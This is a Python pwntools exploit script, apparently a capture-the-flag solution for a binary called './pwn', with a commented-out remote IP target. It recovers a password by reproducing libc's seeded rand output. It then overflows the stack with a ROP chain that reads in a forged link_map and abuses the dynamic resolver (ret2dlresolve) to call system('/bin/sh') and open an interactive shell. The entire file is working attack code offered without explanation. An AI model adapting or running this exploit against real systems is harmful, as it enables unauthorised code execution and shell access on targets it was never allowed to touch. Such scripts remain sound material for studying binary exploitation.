from pwn import *
from ctypes import *

context.arch = 'amd64'
p = process('./pwn')
# p = remote('39.104.26.167', 32123)
elf = ELF('./pwn')
lib = ELF('./libc-2.27.so')
libc = cdll.LoadLibrary('./libc-2.27.so')
libc.srand(0x1f)

a = []
for i in range(31):
    m = libc.rand() % 16
    a.append(m)
password = 's0d0ao2lnfic9alsl2lmxncbzyqi1j2'
new_pass = b''
for i in range(31):
    new_pass += chr(ord((password[i])) ^ a[i]).encode()
new_pass += b'\00'
p.send(new_pass)

sleep(0.3)
plt0 = elf.get_section_by_name('.plt').header.sh_addr
l_addr = lib.sym['system'] - lib.sym['read']
st_value = elf.got['read']


def get_fake_link_map(fake_link_map_addr_, l_addr_, st_value_):
    # the address of each fake pointer
    fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr_)
    fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr_ + 0x8)
    fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr_ + 0x18)
    # fake structure
    fake_Elf64_Dyn_SYM = p64(0) + p64(st_value_ - 0x8)
    fake_Elf64_Dyn_JMPREL = p64(0) + p64(fake_link_map_addr_ + 0x28)
    # JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28
    r_offset = fake_link_map_addr_ - l_addr_
    fake_Elf64_rela = p64(r_offset) + p64(0x7) + p64(0)
    # fake_link_map
    fake_link_map = p64(l_addr_ & (2 ** 64 - 1))  # 0x8
    fake_link_map += fake_Elf64_Dyn_SYM  # 0x18
    fake_link_map += fake_Elf64_Dyn_JMPREL  # 0x28
    fake_link_map += fake_Elf64_rela  # 0x40
    fake_link_map += b"\x00" * 0x28  # 0x68
    fake_link_map += fake_Elf64_Dyn_STR_addr  # STRTAB pointer,0x70
    fake_link_map += fake_Elf64_Dyn_SYM_addr  # SYMTAB pointer,0x78
    fake_link_map += b"/bin/sh\x00".ljust(0x80, b'\x00')  # 0xf8
    fake_link_map += fake_Elf64_Dyn_JMPREL_addr  # JMPREL pointer
    return fake_link_map


pop_rdi_ret = 0x0000000000400af3
pop_rsi_r15_ret = 0x0000000000400af1
ret = 0x0000000000400691
fake_link_map_addr = elf.bss() + 0x300

fake_link_map = get_fake_link_map(fake_link_map_addr, l_addr, st_value)

payload = b'\x00' * 0x38 + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(0) + p64(
    elf.plt['read'])
payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr + 0x78) + p64(plt0 + 6) + p64(fake_link_map_addr) + p64(
    0)

p.sendline(payload)
sleep(0.3)
p.send(fake_link_map)

p.interactive()
